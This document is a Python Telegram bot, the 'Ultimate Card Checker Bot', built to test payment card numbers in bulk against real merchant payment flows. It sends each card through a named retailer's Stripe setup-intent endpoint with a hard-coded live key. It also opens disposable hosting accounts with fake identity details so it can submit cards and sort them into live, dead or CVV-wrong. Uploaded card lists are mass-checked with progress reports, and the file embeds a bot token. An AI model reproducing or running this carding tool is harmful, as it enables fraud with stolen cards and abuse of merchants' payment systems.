import asyncio
import aiohttp
import time
import requests
from bs4 import BeautifulSoup
import json
from io import BytesIO
import random
import string
from typing import Dict, Optional, Callable

from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    MessageHandler,
    filters,
)

# Configuration
DOMAIN = "https://canopyonline.co.uk"
PK = "pk_live_2GI54UG1dqobg2d2fqwUw72A00Hw41Hq1W"
BOT_TOKEN = "8466659336:AAFulSgGq7ZBG_5UTQ7R-E7Nr-LJr3VDA8c"

# Access control
OWNER_ID = 8226656006
authorized_users = {OWNER_ID}

# User states for mass checking
user_states: Dict[int, Dict] = {}


def is_authorized(user_id: int) -> bool:
    """Check if user is authorized to use the bot"""
    return user_id in authorized_users


def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"


async def make_request(session, url, method="POST", params=None, headers=None, data=None, json=None):
    async with session.request(method, url, params=params, headers=headers, data=data, json=json) as response:
        return await response.text()


# ============ STRIPE GATEWAY ============
async def ppc(cards: str, update_callback: Optional[Callable[[int, str], None]] = None):
    """Stripe checker"""
    cc, mon, year, cvv = cards.split("|")
    year = year[-2:]

    async with aiohttp.ClientSession() as my_session:
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "max-age=0",
            "referer": f"{DOMAIN}/my-account/payment-methods/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }

        if update_callback:
            await update_callback(25, "Fetching setup intent 🔍")

        req = await make_request(my_session, url=f"{DOMAIN}/my-account/add-payment-method/", method="GET", headers=headers)
        await asyncio.sleep(1)
        nonce = parseX(req, '"createAndConfirmSetupIntentNonce":"', '"')

        headers2 = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }

        data2 = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": year,
            "card[exp_month]": mon,
            "billing_details[address][postal_code]": "99501",
            "billing_details[address][country]": "US",
            "key": PK,
        }

        if update_callback:
            await update_callback(50, "Creating payment method 💳")

        req2 = await make_request(my_session, "https://api.stripe.com/v1/payment_methods", headers=headers2, data=data2)
        await asyncio.sleep(1)
        pmid = parseX(req2, '"id": "', '"')

        headers3 = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": DOMAIN,
            "referer": f"{DOMAIN}/my-account/add-payment-method/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        data3 = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pmid,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": nonce,
        }

        if update_callback:
            await update_callback(75, "Confirming setup intent ✨")

        req4 = await make_request(my_session, url=f"{DOMAIN}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", headers=headers3, data=data3)
        return req4


# ============ X10 PREMIUM (PAYPAL CVV) ============
def generate_random_email():
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{random_str}@onmailflare.com"


def generate_random_subdomain():
    return ''.join(random.choices(string.ascii_lowercase, k=8))


def parse_card_input(card_string):
    parts = card_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid format")
    
    cardnum, month, year, cvv = parts
    cardnum_formatted = ' '.join([cardnum[i:i+4] for i in range(0, len(cardnum), 4)])
    
    if len(year) == 4:
        year = year[2:]
    elif len(year) != 2:
        raise ValueError("Invalid year")
    
    exp_formatted = f"{month.zfill(2)} / {year}"
    
    return {
        'cardnum': cardnum_formatted,
        'exp': exp_formatted,
        'cvc': cvv,
        'name': 'Melody Kuromi',
        'bin': cardnum[:6],
        'raw': card_string
    }


def create_x10_account():
    """Create fresh account - CLEAN OUTPUT"""
    session = requests.Session()
    
    email = generate_random_email()
    subdomain = generate_random_subdomain()
    password = "beboy123"
    
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    # Step 1: Initial order
    order_data_1 = {
        "package": "infinity",
        "order-submit": "true",
        "term": "monthly",
        "domain": "subdomain",
        "domainstr": subdomain,
        "tld": ".com",
        "sld": "x10.mx",
        "emailaddress": email,
        "password": password,
        "firstname": "Melody",
        "lastname": "Kuromi",
        "address1": "P-8 Salvador Residence",
        "city": "Davao",
        "state": "Davao",
        "postalcode": "8000",
        "country": "PH",
        "idd": "+63",
        "phonenumber": "9694658658",
        "confirmorder": "Please wait.."
    }
    
    session.post("https://x10premium.com/order", headers=headers, data=order_data_1, allow_redirects=False, timeout=10)
    
    # Step 2: Complete order
    order_data_2 = {
        "package": "infinity",
        "domain": "subdomain",
        "order-submit": "true",
        "term": "monthly",
        "domainstr": subdomain,
        "tld": ".com",
        "sld": "x10.mx",
        "firstname": "Melody",
        "lastname": "Kuromi",
        "emailaddress": email,
        "password": password,
        "address1": "P-8 Salvador Residence",
        "postalcode": "8000",
        "city": "Davao",
        "state": "Davao",
        "country": "PH",
        "phonenumber": "9694658658",
        "idd": "+63",
        "completeorder": "Please wait.."
    }
    
    response2 = session.post("https://x10premium.com/order", headers=headers, data=order_data_2, allow_redirects=False, timeout=10)
    
    # Extract order ID (don't expose to user)
    if response2.status_code in [301, 302, 303, 307, 308]:
        location = response2.headers.get('Location', '')
        if '/order/' in location:
            order_id = location.split('/order/')[-1].split('?')[0]
        else:
            return None, None
    else:
        return None, None
    
    # Step 3: Access order page
    session.get(f"https://clients.x10premium.com/order/{order_id}", headers=headers, allow_redirects=False, timeout=10)
    
    # Step 4: Login
    login_page = session.get("https://clients.x10premium.com/login", headers=headers, timeout=10)
    
    # Fast CSRF extraction
    csrf_start = login_page.text.find('name="seasurf" value="')
    if csrf_start == -1:
        return None, None
    csrf_start += 22
    csrf_end = login_page.text.find('"', csrf_start)
    csrf_token = login_page.text[csrf_start:csrf_end]
    
    login_data = {
        "seasurf": csrf_token,
        "do_signin": "true",
        "email": email,
        "password": password
    }
    
    login_response = session.post("https://clients.x10premium.com/do-sign-in", headers=headers, data=login_data, allow_redirects=False, timeout=10)
    
    if login_response.status_code in [301, 302, 303, 307, 308]:
        return session, email
    else:
        return None, None


def check_x10_card(session, card_string):
    """Check card - OPTIMIZED"""
    start_time = time.time()
    
    card_data = parse_card_input(card_string)
    
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "content-type": "application/x-www-form-urlencoded",
        "referer": "https://clients.x10premium.com/payment/card",
        "origin": "https://clients.x10premium.com",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    # Get card page
    card_page = session.get("https://clients.x10premium.com/payment/card", headers=headers, timeout=10)
    
    # Fast CSRF extraction
    csrf_start = card_page.text.find('name="seasurf" value="')
    if csrf_start == -1:
        return None, None, None, None
    csrf_start += 22
    csrf_end = card_page.text.find('"', csrf_start)
    csrf_token = card_page.text[csrf_start:csrf_end]
    
    # Submit card
    form_data = {
        "seasurf": csrf_token,
        "cardnum": card_data['cardnum'],
        "exp": card_data['exp'],
        "name": card_data['name'],
        "cvc": card_data['cvc'],
        "save": "Save Card"
    }
    
    response = session.post("https://clients.x10premium.com/payment/do_card", headers=headers, data=form_data, allow_redirects=True, timeout=10)
    
    elapsed = round(time.time() - start_time, 2)
    response_text = response.text
    
    # Check for APPROVED
    if 'successfully added your' in response_text.lower():
        success_start = response_text.lower().find('successfully added your')
        success_end = response_text.find('</p>', success_start)
        message = response_text[success_start:success_end].strip() if success_end != -1 else "Card successfully added"
        return 'APPROVED', message, elapsed, 'APPROVED'
    
    # Check for errors
    if '<span class="e">' in response_text or '<div class="notice">' in response_text:
        soup = BeautifulSoup(response_text, 'html.parser')
        notice_div = soup.find('div', class_='notice')
        
        if notice_div:
            message_span = notice_div.find('span')
            if message_span:
                message = message_span.get_text(strip=True).strip()
                
                # CORRECTED LOGIC
                if 'card security code' in message.lower() and 'card issuer or bank' in message.lower():
                    return 'DEAD', message, elapsed, 'DEAD'
                elif 'card issuer or bank' in message.lower():
                    return 'DECLINED', message, elapsed, 'DECLINED'
                elif 'card security code' in message.lower():
                    return 'CVV_WRONG', message, elapsed, 'CVV_WRONG'
                else:
                    return 'DECLINED', message, elapsed, 'DECLINED'
    
    return 'UNKNOWN', 'Response unclear', elapsed, 'UNKNOWN'


# ============ UTILITY FUNCTIONS ============
def get_bin_info(bin_number):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            bank = data.get('bank', {}).get('name', 'Unknown')
            brand = data.get('brand', 'Unknown')
            type_ = data.get('type', 'Unknown')
            country = data.get('country', {}).get('name', 'Unknown')
            return f"{bank} - {brand.upper()} - {type_.upper()} - {country}"
        return "BIN lookup failed"
    except:
        return "BIN unavailable"


def get_progress_bar(current: int, total: int = 100, width: int = 10) -> str:
    percent = min(100, max(0, int((current / total) * 100))) if total > 0 else 0
    filled = min(int(percent / 10), width)
    bar = "█" * filled + "░" * (width - filled)
    return f"[{bar}] {percent}%"


def format_single_progress(percent: int, step: str, gateway: str) -> str:
    gateway_emoji = "💳" if gateway == "Stripe" else "💰"
    bar = get_progress_bar(percent)
    return (
        f"🔄 Checking Card {gateway_emoji}\n\n"
        f"━━━━━━━━ 𝑺𝑻𝑨𝑻𝑺 ━━━━━━━━\n"
        f" 𝑺𝒕𝒆𝒑: {step}\n"
        f" 𝑷𝒓𝒐𝒈𝒓𝒆𝒔𝒔: {bar}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )


def process_stripe_output(card_string, result, elapsed_time):
    try:
        data = json.loads(result)
        success = data.get('success', False)
        response_data = data.get('data', {})
        
        if success and response_data.get('status') == 'succeeded':
            status = "APPROVED"
            emoji = "✅"
            message = "Card approved and setup intent succeeded"
        elif not success and 'error' in response_data:
            status = "DECLINED"
            emoji = "❌"
            message = response_data['error'].get('message', 'Card declined')
        else:
            status = "UNKNOWN"
            emoji = "⚠️"
            message = "Unexpected response"
    except:
        if "succeeded" in result.lower():
            status, emoji, message = "APPROVED", "✅", "Card approved"
        elif any(word in result.lower() for word in ["decline", "error"]):
            status, emoji, message = "DECLINED", "❌", "Card declined"
        else:
            status, emoji, message = "UNKNOWN", "⚠️", "Unexpected response"
    
    bin_info = get_bin_info(card_string.split('|')[0][:6])
    
    return (
        f"{emoji} {status}\n\n"
        f"𝑺𝒕𝒂𝒕𝒖𝒔:  𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 ✅\n"
        f"━━━━━━━ 𝑺𝑻𝑨𝑻𝑺 ━━━━━━━\n"
        f" 𝑷𝒓𝒐𝒈𝒓𝒆𝒔𝒔: [██████████] 100%\n\n"
        f"💳 Card: {card_string}\n"
        f"💬 Message: {message}\n"
        f"🏦 BIN: {bin_info}\n"
        f"🌐 Gateway: Stripe\n"
        f"⏱️  Time: {elapsed_time}s"
    )


def process_x10_output(status, message, elapsed_time, card_string, email):
    if status == 'APPROVED':
        emoji = "✅"
        detail = "Card: ✅ | CVV: ✅"
    elif status == 'CVV_WRONG':
        emoji = "🟡"
        status = "LIVE (CVV WRONG)"
        detail = "Card: ✅ | CVV: ❌"
    elif status == 'DEAD':
        emoji = "💀"
        detail = "Card: 💀 | Completely Dead"
    elif status == 'DECLINED':
        emoji = "❌"
        detail = "Card: ❌ | Declined"
    else:
        emoji = "⚠️"
        detail = "Status: Unknown"
    
    bin_info = get_bin_info(card_string.split('|')[0][:6])
    
    return (
        f"{emoji} {status}\n\n"
        f"𝑺𝒕𝒂𝒕𝒖𝒔:  𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 ✅\n"
        f"━━━━━━━ 𝑺𝑻𝑨𝑻𝑺 ━━━━━━━\n"
        f" 𝑷𝒓𝒐𝒈𝒓𝒆𝒔𝒔: [██████████] 100%\n\n"
        f"💳 Card: {card_string}\n"
        f"📋 {detail}\n"
        f"💬 Message: {message}\n"
        f"🏦 BIN: {bin_info}\n"
        f"📧 Email: {email}\n"
        f"🌐 Gateway: PayPal CVV\n"
        f"⏱️  Time: {elapsed_time}s"
    )


def format_progress_stats(current, total, hits, live, dead, errors, cpm, avg_time, gateway, current_card=None):
    progress_bar = get_progress_bar(current, total)
    gateway_emoji = "💳" if gateway == "stripe" else "💰"
    status_emoji = "🔄" if current < total else "✅"
    current_line = f"📝 Current: {current_card[:6]}****..." if current_card else f"📝 Processing {current}/{total}"
    
    return (
        f"{status_emoji} 𝑺𝒕𝒂𝒕𝒖𝒔: 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 {gateway_emoji}\n\n"
        f"━━━━━━━━ 𝑺𝑻𝑨𝑻𝑺 ━━━━━━━━\n"
        f" 𝑷𝒓𝒐𝒈𝒓𝒆𝒔𝒔: {current}/{total} {progress_bar}\n"
        f" 𝑯𝒊𝒕𝒔: {hits} ✅\n"
        f" 𝑳𝒊𝒗𝒆: {live} 🟡\n"
        f" 𝑫𝒆𝒂𝒅: {dead} 💀❌\n"
        f" 𝑬𝒓𝒓𝒐𝒓𝒔: {errors} ⚠️\n"
        f"{current_line}\n"
        f"━━━━━━━━ 𝑷𝑬𝑹𝑭𝑶𝑹𝑴𝑨𝑵𝑪𝑬 ━━━━━━━━\n"
        f" 𝑪𝑷𝑴: {cpm:.1f} cards/min 🚀\n"
        f" 𝑨𝒗𝒈 𝑻𝒊𝒎𝒆: {avg_time:.2f}s ⏱️\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )


# ============ MASS CHECK PROCESSOR ============
async def process_mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE, gateway: str):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if user_id not in user_states:
        await context.bot.send_message(chat_id=chat_id, text="❌ No pending mass check.")
        return
    
    state = user_states[user_id]
    lines = [line.strip() for line in state['file'].getvalue().decode('utf-8').splitlines() if line.strip()]
    total = len(lines)
    
    if total == 0:
        await context.bot.send_message(chat_id=chat_id, text="❌ Empty file.")
        del user_states[user_id]
        return
    
    state['start_time'] = time.time()
    state['processed'] = 0
    state['hits'] = 0
    state['live'] = 0
    state['dead'] = 0
    state['errors'] = 0
    state['times'] = []
    state['results'] = []
    
    initial_text = format_progress_stats(0, total, 0, 0, 0, 0, 0, 0, gateway)
    progress_msg = await context.bot.send_message(chat_id=chat_id, text=initial_text)
    state['progress_msg_id'] = progress_msg.message_id
    
    for i, card in enumerate(lines, 1):
        try:
            current_display = f"{card[:6]}****"
            
            start_card = time.time()
            
            if gateway == "stripe":
                result = await ppc(card)
                elapsed = round(time.time() - start_card, 2)
                output = process_stripe_output(card, result, elapsed)
                
                if "APPROVED" in output:
                    state['hits'] += 1
                else:
                    state['dead'] += 1
            else:  # paypal cvv
                session, email = create_x10_account()
                if not session:
                    state['errors'] += 1
                    output = f"❌ Account creation failed for {card}"
                    elapsed = 1.0
                else:
                    status, message, elapsed, detailed = check_x10_card(session, card)
                    if status:
                        output = process_x10_output(status, message, elapsed, card, email)
                        if status == 'APPROVED':
                            state['hits'] += 1
                        elif status == 'CVV_WRONG':
                            state['live'] += 1
                        elif status in ['DEAD', 'DECLINED']:
                            state['dead'] += 1
                        else:
                            state['errors'] += 1
                    else:
                        state['errors'] += 1
                        output = f"❌ Check failed for {card}"
                        elapsed = 1.0
            
            state['results'].append(output)
            state['times'].append(elapsed)
            state['processed'] = i
            
            # Update progress
            total_time = time.time() - state['start_time']
            avg_time = sum(state['times']) / len(state['times'])
            cpm = (i / total_time * 60) if total_time > 0 else 0
            
            progress_text = format_progress_stats(i, total, state['hits'], state['live'], state['dead'], state['errors'], cpm, avg_time, gateway, current_display)
            await context.bot.edit_message_text(chat_id=chat_id, message_id=state['progress_msg_id'], text=progress_text)
            
            await asyncio.sleep(0.5)
        
        except Exception as e:
            state['errors'] += 1
            state['results'].append(f"❌ Error: {str(e)}")
    
    # Final summary
    total_time = time.time() - state['start_time']
    avg_time = sum(state['times']) / len(state['times'])
    cpm = (total / total_time * 60) if total_time > 0 else 0
    
    final_text = format_progress_stats(total, total, state['hits'], state['live'], state['dead'], state['errors'], cpm, avg_time, gateway)
    final_text += f"\n\n🎉 Complete! Hits: {state['hits']} | Live: {state['live']} | Dead: {state['dead']} | Errors: {state['errors']}"
    
    await context.bot.edit_message_text(chat_id=chat_id, message_id=state['progress_msg_id'], text=final_text)
    
    # Send results in batches
    batch = []
    for result in state['results']:
        batch.append(result)
        if len(batch) == 5:
            await context.bot.send_message(chat_id=chat_id, text="\n\n".join(batch))
            batch = []
            await asyncio.sleep(0.5)
    
    if batch:
        await context.bot.send_message(chat_id=chat_id, text="\n\n".join(batch))
    
    del user_states[user_id]


# ============ TELEGRAM HANDLERS ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ Access Denied! You are not authorized to use this bot. 🚫")
        return
    
    await update.message.reply_text(
        "🔥 **ULTIMATE CARD CHECKER BOT** 🔥\n\n"
        "⚡ **Commands:**\n"
        "💳 `/chk <card>` - Stripe Check\n"
        "💰 `/cvv <card>` - PayPal CVV Check\n"
        "📊 `/masschk` - Stripe Mass Check\n"
        "📊 `/cvvmass` - PayPal CVV Mass Check\n\n"
        "**Format:** `card|MM|YY|CVV`\n"
        "**Example:** `/cvv 4154644406585084|01|31|552`\n\n"
        "🚀 **Features:**\n"
        "✅ Real-time progress updates\n"
        "✅ Accurate status detection\n"
        "✅ BIN lookup included\n"
        "✅ Fresh accounts per check (PayPal CVV)\n\n"
        f"👑 **Owner Commands:**\n"
        f"🔐 `/add <user_id>` - Add user access\n"
        f"🚫 `/remove <user_id>` - Remove user access\n"
        f"👥 `/users` - List authorized users\n\n"
        "Let's gooo! 🎯🔥"
    )


async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only the owner can add users! 👑")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: `/add <user_id>`\n\nExample: `/add 123456789`")
        return
    
    try:
        new_user_id = int(context.args[0])
        authorized_users.add(new_user_id)
        await update.message.reply_text(f"✅ User `{new_user_id}` has been granted access! 🎉")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID! Must be a number.")


async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only the owner can remove users! 👑")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: `/remove <user_id>`\n\nExample: `/remove 123456789`")
        return
    
    try:
        remove_user_id = int(context.args[0])
        if remove_user_id == OWNER_ID:
            await update.message.reply_text("❌ Cannot remove the owner! 👑")
            return
        
        if remove_user_id in authorized_users:
            authorized_users.remove(remove_user_id)
            await update.message.reply_text(f"✅ User `{remove_user_id}` access revoked! 🚫")
        else:
            await update.message.reply_text(f"❌ User `{remove_user_id}` is not in the authorized list.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID! Must be a number.")


async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only the owner can view the user list! 👑")
        return
    
    if len(authorized_users) == 1:
        await update.message.reply_text(f"👥 **Authorized Users:** (1)\n\n👑 {OWNER_ID} (Owner)")
    else:
        users_list = "\n".join([f"{'👑' if uid == OWNER_ID else '👤'} {uid}{' (Owner)' if uid == OWNER_ID else ''}" for uid in authorized_users])
        await update.message.reply_text(f"👥 **Authorized Users:** ({len(authorized_users)})\n\n{users_list}")


async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ Access Denied! Contact the owner for access. 🚫")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: `/chk card|MM|YY|CVV`")
        return
    
    card = " ".join(context.args)
    chat_id = update.effective_chat.id
    
    msg = await update.message.reply_text(format_single_progress(0, "Initializing ⚡", "Stripe"))
    
    async def update_prog(percent: int, step: str):
        await context.bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=format_single_progress(percent, step, "Stripe"))
    
    start_time = time.time()
    try:
        result = await ppc(card, update_prog)
        elapsed = round(time.time() - start_time, 2)
        output = process_stripe_output(card, result, elapsed)
    except Exception as e:
        elapsed = round(time.time() - start_time, 2)
        output = f"❌ Error: {str(e)}\n⏱️ Time: {elapsed}s"
    
    await context.bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=output)


async def cvv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ Access Denied! Contact the owner for access. 🚫")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: `/cvv card|MM|YY|CVV`")
        return
    
    card = " ".join(context.args)
    chat_id = update.effective_chat.id
    
    msg = await update.message.reply_text("🔄 Creating account... 🎭\n\n⏳ Please wait...")
    
    start_time = time.time()
    
    try:
        # Create account
        await context.bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=format_single_progress(20, "Creating account 🎭", "PayPal CVV"))
        session, email = create_x10_account()
        
        if not session:
            await context.bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text="❌ Account creation failed! Try again. 🚫")
            return
        
        await context.bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=format_single_progress(40, "Getting order ID 🔍", "PayPal CVV"))
        await asyncio.sleep(0.3)
        
        await context.bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=format_single_progress(50, "Order ID found ✅", "PayPal CVV"))
        await asyncio.sleep(0.3)
        
        await context.bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=format_single_progress(60, "Account created 🎉", "PayPal CVV"))
        await asyncio.sleep(0.3)
        
        # Check card
        await context.bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=format_single_progress(70, "Fetching card page 📄", "PayPal CVV"))
        await asyncio.sleep(0.2)
        
        await context.bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=format_single_progress(85, "Submitting card 💳", "PayPal CVV"))
        
        status, message, elapsed, detailed = check_x10_card(session, card)
        
        if status:
            output = process_x10_output(status, message, elapsed, card, email)
        else:
            output = f"❌ Check failed\n⏱️ Time: {elapsed}s"
    
    except Exception as e:
        elapsed = round(time.time() - start_time, 2)
        output = f"❌ Error: {str(e)}\n⏱️ Time: {elapsed}s"
    
    await context.bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=output)


async def masschk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ Access Denied! Contact the owner for access. 🚫")
        return
    
    user_states[user_id] = {'gateway': 'stripe'}
    await update.message.reply_text("📤 Send your .txt file for Stripe mass check!\n\n🚀 Real-time updates incoming!")


async def cvvmass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ Access Denied! Contact the owner for access. 🚫")
        return
    
    user_states[user_id] = {'gateway': 'paypalcvv'}
    await update.message.reply_text("📤 Send your .txt file for PayPal CVV mass check!\n\n🔥 Fresh account for EVERY card!\n🚀 Real-time updates incoming!")


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ Access Denied! Contact the owner for access. 🚫")
        return
    
    if user_id not in user_states:
        await update.message.reply_text("❌ Use /masschk or /cvvmass first!")
        return
    
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file.")
        return
    
    file = await context.bot.get_file(document.file_id)
    file_content = BytesIO()
    await file.download_to_memory(file_content)
    user_states[user_id]['file'] = file_content
    
    gateway = user_states[user_id]['gateway']
    await update.message.reply_text(f"🚀 Starting {gateway.upper()} mass check... Let's go! 🔥")
    asyncio.create_task(process_mass_check(update, context, gateway))


def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("chk", chk))
    application.add_handler(CommandHandler("masschk", masschk))
    application.add_handler(CommandHandler("cvv", cvv))
    application.add_handler(CommandHandler("cvvmass", cvvmass))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("🔥🚀 ULTIMATE CARD CHECKER BOT STARTING... 🚀🔥")
    print(f"👑 Owner ID: {OWNER_ID}")
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
